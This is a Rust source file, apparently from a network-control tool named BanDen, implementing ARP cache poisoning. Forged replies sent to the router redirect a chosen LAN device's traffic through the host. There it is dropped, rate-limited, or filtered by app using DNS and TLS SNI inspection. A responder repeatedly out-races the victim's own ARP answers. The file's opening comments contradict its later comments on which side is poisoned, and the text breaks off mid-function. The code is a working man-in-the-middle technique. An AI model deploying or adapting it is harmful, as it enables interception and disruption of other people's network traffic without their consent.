//! Real control backend: ARP-based device isolation and rate limiting.
//!
//! Two modes, chosen from the session's limits:
//!
//! **Cut** (no limits set): forged ARP replies are sent to the TARGET only
//! ("gateway IP is at this PC's MAC"), so the target's internet-bound
//! frames arrive here and are dropped. The gateway's table is never
//! touched.
//!
//! **Shaper** (download or upload limit set): full Selfishnet-style MITM.
//! Both sides are poisoned so ALL of the target's routed traffic flows
//! through this PC, which forwards it — internet keeps working — through
//! per-direction token buckets enforcing the configured limits:
//! - target → PC → gateway, throttled to the upload limit,
//! - gateway → PC → target, throttled to the download limit.
//!   ARP and non-IPv4 frames pass through unthrottled so the device can
//!   always resolve addresses and renew leases.
//!
//! Refusals: the gateway itself and this PC are never valid targets
//! (isolating either takes the network down).
//!
//! Restoration (teardown, verification, journal, watchdog) always sends
//! corrective ARP to both the target and the gateway plus one truthful
//! broadcast, so every poisoned cache re-learns its real mapping within
//! seconds.

use crate::appcatalog::AppDefinition;
use crate::dpi::{parse_dns, parse_sni, transport_of};
use crate::error::{NetError, NetResult};
use crate::rawframe::{
    arp_gratuitous_frame, arp_reply_frame, ipv4_dst, parse_mac, set_ethernet_dst, set_ethernet_src,
    PcapLib, RawSender,
};
use banden_core::error::{CoreError, CoreResult};
use banden_core::recovery::manager::CapturedState;
use banden_core::{ControlBackend, RestorationAction, Session};
use std::collections::HashSet;
use std::net::Ipv4Addr;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

/// Cadence of the periodic forged replies. The sticky responder answers
/// the router's own ARP requests immediately, and phones also send unicast
/// ARP announcements we never see, which flip the router's cache between
/// our refreshes - 500 ms keeps those lapse windows under a second
/// without flooding a weak router's control plane (8 s was tested and
/// lost the entry: the cut visibly failed).
fn poison_interval() -> Duration {
    let ms = std::env::var("BANDEN_POISON_INTERVAL_MS")
        .ok()
        .and_then(|v| v.parse().ok())
        .unwrap_or(500);
    Duration::from_millis(ms.clamp(200, 60_000))
}

/// Corrective replies sent at teardown/verification.
const CORRECT_BURST: usize = 4;
const CORRECT_SPACING: Duration = Duration::from_millis(250);
/// Capture read timeout: bounds how often the forwarder checks its stop flag.
const CAPTURE_TIMEOUT_MS: i32 = 400;
/// Connection-reset window for per-app sessions: for this long after the
/// session starts, the target's TCP/QUIC is dropped (DNS excepted). This
/// kills flows that predate the session - a blocked app's pre-existing
/// connection would otherwise live until it naturally expires. Non-blocked
/// apps reconnect instantly once the window closes.
const RESET_WINDOW: Duration = Duration::from_secs(15);

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Mode {
    Cut,
    Shape { down_bps: u64, up_bps: u64 },
}

fn mode_for(session: &Session) -> Mode {
    match (
        session.config.download_limit_bps,
        session.config.upload_limit_bps,
    ) {
        (None, None) => Mode::Cut,
        (down, up) => Mode::Shape {
            down_bps: down.unwrap_or(u64::MAX),
            up_bps: up.unwrap_or(u64::MAX),
        },
    }
}

/// Live byte counters of the active shaper session (atomics so the
/// forwarder thread updates them lock-free).
#[derive(Debug, Default)]
pub struct ShaperStats {
    pub up_forwarded_bytes: std::sync::atomic::AtomicU64,
    pub up_dropped_bytes: std::sync::atomic::AtomicU64,
    pub down_forwarded_bytes: std::sync::atomic::AtomicU64,
    pub down_dropped_bytes: std::sync::atomic::AtomicU64,
    /// Bytes of blocked-app traffic dropped by the app policy.
    pub app_dropped_bytes: std::sync::atomic::AtomicU64,
}

impl ShaperStats {
    pub fn snapshot(&self) -> (u64, u64, u64, u64, u64) {
        use std::sync::atomic::Ordering::Relaxed;
        (
            self.up_forwarded_bytes.load(Relaxed),
            self.up_dropped_bytes.load(Relaxed),
            self.down_forwarded_bytes.load(Relaxed),
            self.down_dropped_bytes.load(Relaxed),
            self.app_dropped_bytes.load(Relaxed),
        )
    }
}

struct TaskHandles {
    stop: Arc<AtomicBool>,
    poison: Option<std::thread::JoinHandle<()>>,
    forwarder: Option<std::thread::JoinHandle<()>>,
    stats: Option<Arc<ShaperStats>>,
}

pub struct ArpCutBackend {
    lib: Arc<PcapLib>,
    active: Mutex<Option<TaskHandles>>,
}

impl ArpCutBackend {
    /// Stats of the currently active shaper session, if any.
    pub fn stats(&self) -> Option<(u64, u64, u64, u64, u64)> {
        let guard = self.active.lock().unwrap();
        guard
            .as_ref()
            .and_then(|t| t.stats.as_ref())
            .map(|s| s.snapshot())
    }
}

struct Context {
    device: String,
    our_mac: [u8; 6],
    our_ip: Ipv4Addr,
    gateway_ip: Ipv4Addr,
    gateway_mac: [u8; 6],
    target_ip: Ipv4Addr,
    target_mac: [u8; 6],
}

impl ArpCutBackend {
    pub fn new() -> NetResult<Arc<Self>> {
        Ok(Arc::new(Self {
            lib: PcapLib::load()?,
            active: Mutex::new(None),
        }))
    }
}

/// Resolve the wpcap device name for the interface that owns `target`.
pub fn resolve_device(
    lib: &Arc<PcapLib>,
    target: Ipv4Addr,
) -> NetResult<(String, banden_core::InterfaceInfo)> {
    let interfaces = crate::interfaces::list_interfaces()?;
    let sel = interface_for_target(&interfaces, target)
        .ok_or_else(|| NetError::InterfaceNotFound(format!("no interface routes {target}")))?;

    let guid: String = sel
        .id
        .trim_matches(|c| c == '{' || c == '}')
        .to_ascii_uppercase();
    let devices = lib.list_devices()?;
    let found = devices
        .into_iter()
        .find(|(name, _)| name.to_ascii_uppercase().contains(&guid));
    match found {
        Some((name, _)) => Ok((name, sel)),
        None => Err(NetError::PcapOpen(format!(
            "adapter {} not visible to wpcap (is it disabled?)",
            sel.friendly_name
                .clone()
                .unwrap_or_else(|| sel.name.clone())
        ))),
    }
}

/// The interface whose subnet contains `target`, else the default pick.
pub fn interface_for_target(
    interfaces: &[banden_core::InterfaceInfo],
    target: Ipv4Addr,
) -> Option<banden_core::InterfaceInfo> {
    let contains = |i: &banden_core::InterfaceInfo| -> bool {
        let (Some(ip_str), Some(cidr)) = (&i.ipv4, &i.cidr) else {
            return false;
        };
        let Ok(ip) = ip_str.parse::<Ipv4Addr>() else {
            return false;
        };
        let Some((net_str, prefix_str)) = cidr.split_once('/') else {
            return false;
        };
        let (Ok(_net), Ok(prefix)) = (net_str.parse::<Ipv4Addr>(), prefix_str.parse::<u8>()) else {
            return false;
        };
        let mask: u32 = if prefix == 0 {
            0
        } else if prefix >= 32 {
            u32::MAX
        } else {
            u32::MAX << (32 - prefix as u32)
        };
        (u32::from(ip) & mask) == (u32::from(target) & mask)
    };
    interfaces
        .iter()
        .find(|i| i.is_up && !i.is_loopback && contains(i))
        .cloned()
        .or_else(|| crate::interfaces::select_interface(interfaces, None))
}

fn build_context(lib: &Arc<PcapLib>, session: &Session) -> CoreResult<Context> {
    let target_ip: Ipv4Addr = session.config.target_ip.parse().map_err(|_| {
        CoreError::InvalidConfig(format!("bad target ip {}", session.config.target_ip))
    })?;
    let target_mac = parse_mac(&session.config.target_mac)
        .map_err(|e| CoreError::InvalidConfig(e.to_string()))?;

    let (device, sel) =
        resolve_device(lib, target_ip).map_err(|e| CoreError::Backend(e.to_string()))?;
    let our_mac = parse_mac(
        sel.mac_address
            .as_deref()
            .ok_or_else(|| CoreError::Backend("selected adapter has no MAC".into()))?,
    )
    .map_err(|e| CoreError::Backend(e.to_string()))?;
    let our_ip: Ipv4Addr = sel
        .ipv4
        .as_deref()
        .and_then(|g| g.parse().ok())
        .ok_or_else(|| CoreError::Backend("selected adapter has no IPv4".into()))?;
    let gateway_ip: Ipv4Addr = sel
        .gateway
        .as_deref()
        .and_then(|g| g.parse().ok())
        .ok_or_else(|| CoreError::Backend("selected adapter has no gateway".into()))?;

    // Isolating or shaping the gateway itself (or this PC) would take the
    // whole network down; refuse explicitly.
    if target_ip == gateway_ip {
        return Err(CoreError::InvalidConfig(
            "refusing to control the gateway itself - pick a device behind it".into(),
        ));
    }
    if target_ip == our_ip {
        return Err(CoreError::InvalidConfig(
            "refusing to control this PC - pick another device".into(),
        ));
    }

    // Resolve the gateway's true MAC before touching anything.
    let gateway_mac_str = crate::arp::probe_arp(gateway_ip).ok_or_else(|| {
        CoreError::Backend("gateway did not answer ARP; cannot safely start".into())
    })?;
    let gateway_mac = parse_mac(&gateway_mac_str).map_err(|e| CoreError::Backend(e.to_string()))?;

    Ok(Context {
        device,
        our_mac,
        our_ip,
        gateway_ip,
        gateway_mac,
        target_ip,
        target_mac,
    })
}

// ---------------------------------------------------------------------------
// Poison / correction frames
// ---------------------------------------------------------------------------

/// Frames sent on a fixed cadence while the session is active.
fn poison_frames(ctx: &Context, _mode: Mode) -> Vec<Vec<u8>> {
    // ROUTER-ONLY poisoning, always.
    //
    // Wire-verified on this LAN: sending poisoned ARP replies TO the
    // target device (the classic Netcut client-side poison) creates an
    // ARP conflict on it that stalls the router's control plane - the
    // PC and other devices lose ~50% of packets for the whole session.
    // MIUI also ignores those replies for data routing, so they bought
    // nothing. Poisoning ONLY the router's entry for the target gives
    // full control (its routed traffic to the target flows through this
    // PC) with zero measurable impact on the rest of the network.
    vec![arp_reply_frame(
        ctx.our_mac,
        ctx.target_ip,
        ctx.gateway_mac,
        ctx.gateway_ip,
    )]
}

fn corrective_unicast(ctx: &Context) -> Vec<Vec<u8>> {
    // Only the gateway was poisoned, so only the gateway needs the truth
    // about the target. The target was never sent any poisoned frame.
    vec![arp_reply_frame(
        ctx.target_mac,
        ctx.target_ip,
        ctx.gateway_mac,
        ctx.gateway_ip,
    )]
}

fn corrective_broadcast(ctx: &Context) -> Vec<u8> {
    // Truthful broadcast gratuitous reply: the gateway really is at the
    // gateway's MAC. Every host that hears this simply refreshes correct
    // state; the poisoned target heals even if the unicast was missed.
    arp_gratuitous_frame(ctx.gateway_mac, ctx.gateway_ip)
}

fn send_correctives(ctx: &Context, lib: &Arc<PcapLib>) -> CoreResult<()> {
    let frames = corrective_unicast(ctx);
    let broadcast = corrective_broadcast(ctx);
    let device = ctx.device.clone();
    let lib = Arc::clone(lib);
    lib.with_sender(&device, |sender| {
        for _ in 0..CORRECT_BURST {
            for f in &frames {
                sender.send(f)?;
            }
            sender.send(&broadcast)?;
            std::thread::sleep(CORRECT_SPACING);
        }
        Ok(())
    })
    .map_err(|e| CoreError::Backend(e.to_string()))
}

// ---------------------------------------------------------------------------
// Shaper forwarder
// ---------------------------------------------------------------------------

/// Token bucket over bytes. Refills continuously; frames larger than the
/// remaining tokens are dropped (TCP backs off and the average rate
/// converges to the limit).
struct TokenBucket {
    rate_bytes_per_sec: f64,
    capacity: f64,
    tokens: f64,
    last: Instant,
}

impl TokenBucket {
    fn new(bps: u64, burst_mult: f64) -> Self {
        let rate = bps as f64 / 8.0; // bytes per second
                                     // Burst: at least a few frames, ~250 ms worth otherwise
                                     // (scaled by the session's priority). rate 0 is a hard
                                     // blackhole (whole-device cut): no burst floor, or the
                                     // first ~12 KB of the target's traffic leaks through
                                     // before the drop starts.
        let capacity = if rate <= 0.0 {
            0.0
        } else {
            ((rate / 4.0) * burst_mult).clamp(1500.0 * 8.0, 8.0 * 1024.0 * 1024.0)
        };
        Self {
            rate_bytes_per_sec: rate,
            capacity,
            tokens: capacity,
            last: Instant::now(),
        }
    }

    fn take(&mut self, n: usize) -> bool {
        if self.rate_bytes_per_sec >= f64::MAX / 2.0 {
            return true; // unlimited
        }
        let now = Instant::now();
        let elapsed = now.duration_since(self.last).as_secs_f64();
        self.last = now;
        self.tokens = (self.tokens + elapsed * self.rate_bytes_per_sec).min(self.capacity);
        if self.tokens >= n as f64 {
            self.tokens -= n as f64;
            true
        } else {
            false
        }
    }
}

/// Capture/forward loop for shaper mode. Owns its promiscuous handle on a
/// dedicated thread.
/// What the forwarder does with the target's routed traffic.
pub enum ForwardPolicy {
    /// Whole-device cut: drop everything (ARP responder stays active).
    DropAll,
    /// Forward within the rate buckets, dropping flows that match the
    /// blocked apps (per-application cut): by DNS/SNI name OR by the
    /// app's announced IP ranges (covers cached endpoints).
    Filter { blocked: Arc<CompiledBlocked> },
    /// Allowlist cut (default-deny): ONLY traffic classified as the
    /// allowed apps passes; everything else on the target - including
    /// flows to unknown endpoints, QUIC, and other encrypted-DNS-dodging
    /// protocols - is dropped. Closes the holes a denylist can't.
    Allow { allowed: Arc<CompiledBlocked> },
}

/// Precompiled match data for the blocked apps.
pub struct CompiledBlocked {
    pub apps: Vec<&'static AppDefinition>,
    /// Parsed "a.b.c.d/len" as (network, mask), applied to the REMOTE
    /// address of each target flow.
    pub cidrs: Vec<(u32, u32)>,
}

impl CompiledBlocked {
    pub fn from_ids(ids: &[String]) -> Self {
        let apps = crate::appcatalog::resolve_ids(ids);
        let mut cidrs = Vec::new();
        for app in &apps {
            for c in &app.cidrs {
                if let Some((net, mask)) = parse_cidr(c) {
                    cidrs.push((net, mask));
                }
            }
        }
        Self { apps, cidrs }
    }

    pub fn ip_blocked(&self, ip: u32) -> bool {
        self.cidrs.iter().any(|(net, mask)| ip & mask == *net)
    }
}

/// Wire-order IPv4 bytes -> the numeric convention shared with
/// CompiledBlocked (big-endian, same value as u32::from(Ipv4Addr)).
fn wire_ip_u32(b: [u8; 4]) -> u32 {
    u32::from_be_bytes(b)
}

fn parse_cidr(c: &str) -> Option<(u32, u32)> {
    let (addr, len) = c.split_once('/')?;
    let octets: Vec<u8> = addr
        .split('.')
        .map(|o| o.parse().ok())
        .collect::<Option<_>>()?;
    if octets.len() != 4 {
        return None;
    }
    let ip = u32::from_be_bytes([octets[0], octets[1], octets[2], octets[3]]);
    let len: u32 = len.parse().ok()?;
    if len > 32 {
        return None;
    }
    let mask = if len == 0 { 0 } else { u32::MAX << (32 - len) };
    Some((ip & mask, mask))
}

/// Canonical 5-tuple key (direction-independent).
fn flow_key(a: [u8; 4], ap: u16, b: [u8; 4], bp: u16) -> [u8; 12] {
    let (ip_a, port_a, ip_b, port_b) = if a <= b {
        (a, ap, b, bp)
    } else {
        (b, bp, a, ap)
    };
    let mut k = [0u8; 12];
    k[0..4].copy_from_slice(&ip_a);
    k[4..6].copy_from_slice(&port_a.to_be_bytes());
    k[6..10].copy_from_slice(&ip_b);
    k[10..12].copy_from_slice(&port_b.to_be_bytes());
    k
}

/// Does `name` (DNS name or SNI) match any ALLOWED app's domains?
fn name_allowed(allowed: &CompiledBlocked, name: &str) -> bool {
    let n = name.trim_end_matches('.').to_ascii_lowercase();
    allowed.apps.iter().any(|a| {
        a.domains
            .iter()
            .any(|d| n == d.as_str() || n.ends_with(&format!(".{d}")))
    })
}

/// Does `name` (DNS name or SNI) match any blocked app's domains?
fn name_blocked(blocked: &CompiledBlocked, name: &str) -> bool {
    let n = name.trim_end_matches('.').to_ascii_lowercase();
    blocked.apps.iter().any(|a| {
        a.domains
            .iter()
            .any(|d| n == d.as_str() || n.ends_with(&format!(".{d}")))
    })
}

/// Rates + burst for one shaping run.
struct RatePlan {
    down_bps: u64,
    up_bps: u64,
    burst_mult: f64,
}

fn forwarder_loop(
    lib: Arc<PcapLib>,
    ctx: Arc<Context>,
    stop: Arc<AtomicBool>,
    plan: RatePlan,
    policy: ForwardPolicy,
    stats: Arc<ShaperStats>,
) {
    let opened = RawSender::open_ex(Arc::clone(&lib), &ctx.device, true, CAPTURE_TIMEOUT_MS);
    let sender = match opened {
        Ok(s) => s,
        Err(e) => {
            tracing::error!(error = %e, "arp-shaper: cannot open adapter for capture");
            return;
        }
    };
    let mut down = TokenBucket::new(plan.down_bps, plan.burst_mult);
    let mut up = TokenBucket::new(plan.up_bps, plan.burst_mult);
    // Allowlist-mode classification state.
    let mut allowed_flows: HashSet<[u8; 12]> = HashSet::new();
    let mut denied_flows: HashSet<[u8; 12]> = HashSet::new();
    let mut pending_flows: HashSet<[u8; 12]> = HashSet::new();
    let mut allowed_ips: HashSet<u32> = HashSet::new();
    let mut denied_ips: HashSet<u32> = HashSet::new();
    // Per-app sessions open with a connection-reset window (see RESET_WINDOW).
    let reset_until = match &policy {
        ForwardPolicy::Filter { .. } | ForwardPolicy::Allow { .. } => {
            Some(Instant::now() + RESET_WINDOW)
        }
        ForwardPolicy::DropAll => None,
    };
    let mut forwarded: u64 = 0;
    let mut dropped: u64 = 0;
    let mut app_dropped: u64 = 0;
    // Per-app state learned from the target's traffic (bounded in practice:
    // entries only accumulate for actually-blocked endpoints).
    let mut blocked_ips: HashSet<u32> = HashSet::new();
    let mut blocked_flows: HashSet<[u8; 12]> = HashSet::new();
    // Sticky answer for the router's periodic "who has target?" requests.
    let who_has_target =
        arp_reply_frame(ctx.our_mac, ctx.target_ip, ctx.gateway_mac, ctx.gateway_ip);

    while !stop.load(Ordering::SeqCst) {
        let frame = match sender.recv() {
            Ok(Some(f)) => f,
            Ok(None) => continue, // read timeout
            Err(e) => {
                tracing::error!(error = %e, "arp-shaper: capture failed");
                break;
            }
        };
        if frame.len() < 34 {
            continue;
        }
        let src: [u8; 6] = frame[6..12].try_into().unwrap();
        let dst: [u8; 6] = frame[0..6].try_into().unwrap();
        let is_arp = frame[12] == 0x08 && frame[13] == 0x06;

        // Sticky ARP responder: when the router broadcasts a fresh request
        // for the target's address it is about to re-learn the mapping -
        // and the target answers over the air, undoing the poison. Reply
        // immediately with several copies: the phone's own over-the-air
        // answer races our wired one and whichever lands last wins the
        // router's cache, so more copies win more of those races
        // (power-save phones answer fast).
        if is_arp && frame.len() >= 42 {
            let op = u16::from_be_bytes([frame[20], frame[21]]);
            let spa = u32::from_be_bytes([frame[28], frame[29], frame[30], frame[31]]);
            let tpa = u32::from_be_bytes([frame[38], frame[39], frame[40], frame[41]]);
            if op == 1 && spa == u32::from(ctx.gateway_ip) && tpa == u32::from(ctx.target_ip) {
                for _ in 0..4 {
                    let _ = sender.send(&who_has_target);
                }
                continue;
            }
        }

        // Connection-reset window: drop the target's TCP and non-DNS UDP
        // (QUIC included) so every pre-existing flow dies. DNS passes so
        // non-blocked apps can re-resolve and recover; blocked apps' DNS
        // and reconnects are handled by the normal rules below.
        if let Some(until) = reset_until {
            if Instant::now() < until && !is_arp {
                let passes = frame[12] == 0x08
                    && frame[13] == 0x00
                    && frame.len() >= 38
                    && frame[23] == 17
                    && (u16::from_be_bytes([frame[34], frame[35]]) == 53
                        || u16::from_be_bytes([frame[36], frame[37]]) == 53);
                if !passes {
                    continue;
                }
            }
        }

        // Target upstream: target -> PC -> gateway.
        if src == ctx.target_mac && dst == ctx.our_mac {
            if is_arp {
                // Let ARP through unthrottled, retargeted at the gateway.
                let mut f = frame.clone();
                set_ethernet_dst(&mut f, &ctx.gateway_mac);
                set_ethernet_src(&mut f, &ctx.our_mac);
                let _ = sender.send(&f);
                continue;
            }
            let Some(transport) = transport_of(&frame) else {
                continue;
            };
            if transport.ip_dst == ctx.our_ip.octets() {
                // Traffic addressed to this PC: consume, not forward.
                continue;
            }

            // Per-app policy (upstream): DNS queries and TLS ClientHellos
            // pass through us for stacks that route the target's upstream
            // this way.
            if let ForwardPolicy::Filter { blocked } = &policy {
                if !blocked.apps.is_empty() && transport.proto == 17 && transport.dst_port == 53 {
                    let off = transport.payload_off.unwrap_or(frame.len());
                    if let Some(dns) = parse_dns(&frame[off..]) {
                        if dns.queries.iter().any(|q| name_blocked(blocked, q)) {
                            stats
                                .app_dropped_bytes
                                .fetch_add(frame.len() as u64, Ordering::Relaxed);
                            app_dropped += 1;
                            continue; // blocked app's resolution fails
                        }
                    }
                } else if !blocked.apps.is_empty() && transport.proto == 6 {
                    if let Some(off) = transport.payload_off {
                        if off < frame.len() {
                            if let Some(sni) = parse_sni(&frame[off..]) {
                                if name_blocked(blocked, &sni) {
                                    // Remember the server endpoint and the
                                    // flow; every later packet on it dies.
                                    blocked_ips.insert(wire_ip_u32(transport.ip_dst));
                                    blocked_flows.insert(flow_key(
                                        transport.ip_src,
                                        transport.src_port,
                                        transport.ip_dst,
                                        transport.dst_port,
                                    ));
                                    stats
                                        .app_dropped_bytes
                                        .fetch_add(frame.len() as u64, Ordering::Relaxed);
                                    app_dropped += 1;
                                    continue;
                                }
                            }
                        }
                    }
                }
                let src_blocked = blocked.ip_blocked(wire_ip_u32(transport.ip_src));
                let key = flow_key(
                    transport.ip_src,
                    transport.src_port,
                    transport.ip_dst,
                    transport.dst_port,
                );
                if src_blocked
                    || blocked_ips.contains(&wire_ip_u32(transport.ip_dst))
                    || blocked_flows.contains(&key)
                {
                    blocked_flows.insert(key);
                    stats
                        .app_dropped_bytes
                        .fetch_add(frame.len() as u64, Ordering::Relaxed);
                    app_dropped += 1;
                    continue;
                }
            } else if let ForwardPolicy::Allow { allowed } = &policy {
                // Allowlist upstream: DNS queries and ping pass; every other
                // flow must earn its way through an allowed SNI, an allowed
                // CIDR, or a DNS-learned allowed endpoint. A SYN passes
                // tentatively just to elicit the ClientHello.
                let key = flow_key(
                    transport.ip_src,
                    transport.src_port,
                    transport.ip_dst,
                    transport.dst_port,
                );
                if transport.proto == 17 && transport.dst_port == 53 {
                    // resolution passes; the response is classified downstream
                } else if transport.proto == 1
                    || (transport.proto == 17 && transport.dst_port == 123)
                {
                    // ping / NTP pass
                } else if allowed_flows.contains(&key)
                    || allowed_ips.contains(&wire_ip_u32(transport.ip_dst))
                {
                    // fall through to forward
                } else if denied_flows.contains(&key)
                    || denied_ips.contains(&wire_ip_u32(transport.ip_dst))
                {
                    stats
                        .app_dropped_bytes
                        .fetch_add(frame.len() as u64, Ordering::Relaxed);
                    app_dropped += 1;
                    continue;
                } else if transport.proto == 6 {
                    let off = transport.payload_off.unwrap_or(frame.len());
                    if off >= frame.len() {
                        // header-only TCP (SYN/ACK/FIN): pass tentatively
                        pending_flows.insert(key);
                    } else if let Some(sni) = parse_sni(&frame[off..]) {
                        if name_allowed(allowed, &sni) {
                            allowed_flows.insert(key);
                            allowed_ips.insert(wire_ip_u32(transport.ip_dst));
                            // fall through to forward
                        } else {
                            denied_flows.insert(key);
                            stats
                                .app_dropped_bytes
                                .fetch_add(frame.len() as u64, Ordering::Relaxed);
                            app_dropped += 1;
                            continue;
                        }
                    } else {
                        // data on an unclassified flow: default deny
                        stats
                            .app_dropped_bytes
                            .fetch_add(frame.len() as u64, Ordering::Relaxed);
                        app_dropped += 1;
                        continue;
                    }
                } else {
                    // other protocols (QUIC etc.): default deny
                    stats
                        .app_dropped_bytes
                        .fetch_add(frame.len() as u64, Ordering::Relaxed);
                    app_dropped += 1;
                    continue;
                }
            }

            if up.take(frame.len()) {
                let mut f = frame.clone();
                set_ethernet_dst(&mut f, &ctx.gateway_mac);
                let _ = sender.send(&f);
                forwarded += 1;
            } else {
                dropped += 1;
            }
            continue;
        }

        // Target downstream: gateway -> PC -> target.
        if src == ctx.gateway_mac && dst == ctx.our_mac && !is_arp {
            if ipv4_dst(&frame) != Some(ctx.target_ip) {
                continue;
            }

            // Per-app policy (downstream): DNS responses carry the answers
            // for everything the target resolves; data from learned blocked
            // endpoints is dropped.
            if let ForwardPolicy::Filter { blocked } = &policy {
                if !blocked.apps.is_empty() {
                    if let Some(transport) = transport_of(&frame) {
                        if transport.proto == 17 && transport.src_port == 53 {
                            // DNS response: if it answers a blocked app's
                            // name, blackhole the response and learn the
                            // answer addresses.
                            let off = transport.payload_off.unwrap_or(frame.len());
                            if let Some(dns) = parse_dns(&frame[off..]) {
                                let name_hit =
                                    dns.answer_names.iter().any(|n| name_blocked(blocked, n));
                                let ip_hit = dns
                                    .answer_ips
                                    .iter()
                                    .any(|ip| blocked.ip_blocked(u32::from(*ip)));
                                if name_hit || ip_hit {
                                    for ip in &dns.answer_ips {
                                        blocked_ips.insert(u32::from(*ip));
                                    }
                                    stats
                                        .app_dropped_bytes
                                        .fetch_add(frame.len() as u64, Ordering::Relaxed);
                                    app_dropped += 1;
                                    continue;
                                }
                            }
                        } else {
                            // Data to the target from a blocked range or a
                            // learned blocked endpoint: blackhole.
                            let dst_hit = blocked.ip_blocked(wire_ip_u32(transport.ip_dst));
                            let src_hit = blocked.ip_blocked(wire_ip_u32(transport.ip_src));
                            let key = flow_key(
                                transport.ip_src,
                                transport.src_port,
                                transport.ip_dst,
                                transport.dst_port,
                            );
                            if dst_hit
                                || src_hit
                                || blocked_ips.contains(&wire_ip_u32(transport.ip_src))
                                || blocked_flows.contains(&key)
                            {
                                blocked_flows.insert(key);
                                stats
                                    .app_dropped_bytes
                                    .fetch_add(frame.len() as u64, Ordering::Relaxed);
                                app_dropped += 1;
                                continue;
                            }
                        }
                    }
                }
            } else if let ForwardPolicy::Allow { allowed } = &policy {
                let Some(transport) = transport_of(&frame) else {
                    continue;
                };
                // Allowlist downstream: DNS responses pass (learning which
                // resolved IPs belong to allowed apps); ping and NTP pass;
                // everything else forwards only for allowed endpoints or
                // flows. Unknown flows are default-deny.
                let key = flow_key(
                    transport.ip_src,
                    transport.src_port,
                    transport.ip_dst,
                    transport.dst_port,
                );
                if transport.proto == 17 && transport.src_port == 53 {
                    let off = transport.payload_off.unwrap_or(frame.len());
                    if let Some(dns) = parse_dns(&frame[off..]) {
                        for (ip4, n) in dns.answer_ips.iter().zip(&dns.answer_names) {
                            let ip_u = u32::from(*ip4);
                            if name_allowed(allowed, n) {
                                allowed_ips.insert(ip_u);
                                denied_ips.remove(&ip_u);
                            } else {
                                denied_ips.insert(ip_u);
                            }
                        }
                    }
                    // fall through to forward (resolutions must reach the phone)
                } else if transport.proto == 1
                    || (transport.proto == 17 && transport.src_port == 123)
                {
                    // ping / NTP pass
                } else if allowed_ips.contains(&wire_ip_u32(transport.ip_src))
                    || allowed_flows.contains(&key)
                {
                    allowed_flows.insert(key);
                    // fall through to forward
                } else if denied_ips.contains(&wire_ip_u32(transport.ip_src))
                    || denied_flows.contains(&key)
                {
                    stats
                        .app_dropped_bytes
                        .fetch_add(frame.len() as u64, Ordering::Relaxed);
                    app_dropped += 1;
                    continue;
                } else {
                    let off = transport.payload_off.unwrap_or(frame.len());
                    let no_payload = off >= frame.len();
                    if no_payload && pending_flows.contains(&key) {
                        // handshake completing for a tentative flow
                        // fall through to forward
                    } else {
                        // unclassified downstream data: the upstream side
                        // never produced an allowed ClientHello - deny.
                        denied_flows.insert(key);
                        stats
                            .app_dropped_bytes
                            .fetch_add(frame.len() as u64, Ordering::Relaxed);
                        app_dropped += 1;
                        continue;
                    }
                }
            }

            if down.take(frame.len()) {
                let mut f = frame.clone();
                set_ethernet_dst(&mut f, &ctx.target_mac);
                set_ethernet_src(&mut f, &ctx.our_mac);
                let _ = sender.send(&f);
                stats
                    .down_forwarded_bytes
                    .fetch_add(frame.len() as u64, Ordering::Relaxed);
                forwarded += 1;
            } else {
                stats
                    .down_dropped_bytes
                    .fetch_add(frame.len() as u64, Ordering::Relaxed);
                dropped += 1;
            }
        }
    }
    tracing::info!(
        forwarded,
        dropped,
        app_dropped,
        "arp-shaper: forwarder stopped"
    );
}

// ---------------------------------------------------------------------------
// ControlBackend
// ---------------------------------------------------------------------------

#[async_trait::async_trait]
impl ControlBackend for ArpCutBackend {
    fn name(&self) -> &'static str {
        "arp-cut"
    }

    async fn prepare(&self, session: &Session) -> CoreResult<CapturedState> {
        let ctx = build_context(&self.lib, session)?;
        let mode = mode_for(session);
        tracing::info!(
            target = %ctx.target_ip,
            gateway = %ctx.gateway_ip,
            device = %ctx.device,
            mode = ?mode,
            "arp backend: prepared"
        );
        // Journaled BEFORE apply: if BanDen dies mid-session, the watchdog
        // broadcasts these corrective announcements and both hosts heal.
        Ok(CapturedState {
            description: match mode {
                Mode::Cut => format!("ARP isolation of {}", ctx.target_ip),
                Mode::Shape { down_bps, up_bps } => format!(
                    "ARP shaping of {} (down {down_bps} bps, up {up_bps} bps)",
                    ctx.target_ip
                ),
            },
            actions: vec![
                RestorationAction::RestoreNeighborEntry {
                    ip: ctx.gateway_ip.to_string(),
                    mac: format_mac(&ctx.gateway_mac),
                },
                RestorationAction::RestoreNeighborEntry {
                    ip: ctx.target_ip.to_string(),
                    mac: format_mac(&ctx.target_mac),
                },
            ],
        })
    }

    async fn apply(&self, session: &Session) -> CoreResult<()> {
        let ctx = Arc::new(build_context(&self.lib, session)?);
        let mode = mode_for(session);

        self.stop_tasks().await;

        let stop = Arc::new(AtomicBool::new(false));
        let stop_poison = Arc::clone(&stop);
        let lib = Arc::clone(&self.lib);
        let frames = poison_frames(&ctx, mode);
        let device = ctx.device.clone();

        let poison = std::thread::spawn(move || {
            let sender = match RawSender::open(lib, &device) {
                Ok(s) => s,
                Err(e) => {
                    tracing::error!(error = %e, "arp backend: cannot open adapter for sending");
                    return;
                }
            };
            let mut n: u64 = 0;
            // Adaptive cadence: 3 fast repeats win the ARP entry (racing
            // the target's own traffic), then a slow maintenance drip to
            // keep conflict events on the router to a minimum.
            while !stop_poison.load(Ordering::SeqCst) {
                for f in &frames {
                    if let Err(e) = sender.send(f) {
                        tracing::error!(error = %e, "arp backend: poison frame failed");
                    }
                }
                n += 1;
                let delay = if n < 3 {
                    Duration::from_millis(400)
                } else {
                    poison_interval()
                };
                if n % 10 == 1 {
                    tracing::info!(batches = n, "arp backend: poison frames sent");
                }
                std::thread::sleep(delay);
            }
            tracing::info!(batches = n, "arp backend: poison loop stopped");
        });

        let stats = Arc::new(ShaperStats::default());
        // Forward policy: whole-device cut drops everything; per-app
        // sessions forward all traffic EXCEPT the blocked apps (those are
        // dropped). Shaping buckets apply to whatever is forwarded.
        let policy = if !session.config.blocked_apps.is_empty() {
            ForwardPolicy::Filter {
                blocked: Arc::new(CompiledBlocked::from_ids(&session.config.blocked_apps)),
            }
        } else if !session.config.allowed_apps.is_empty() {
            ForwardPolicy::Allow {
                allowed: Arc::new(CompiledBlocked::from_ids(&session.config.allowed_apps)),
            }
        } else {
            ForwardPolicy::DropAll
        };
        let (down_rate, up_rate) = match (&mode, &policy) {
            // Per-app cut keeps the rest of the device online at full speed.
            (Mode::Cut, ForwardPolicy::Filter { .. }) => (u64::MAX, u64::MAX),
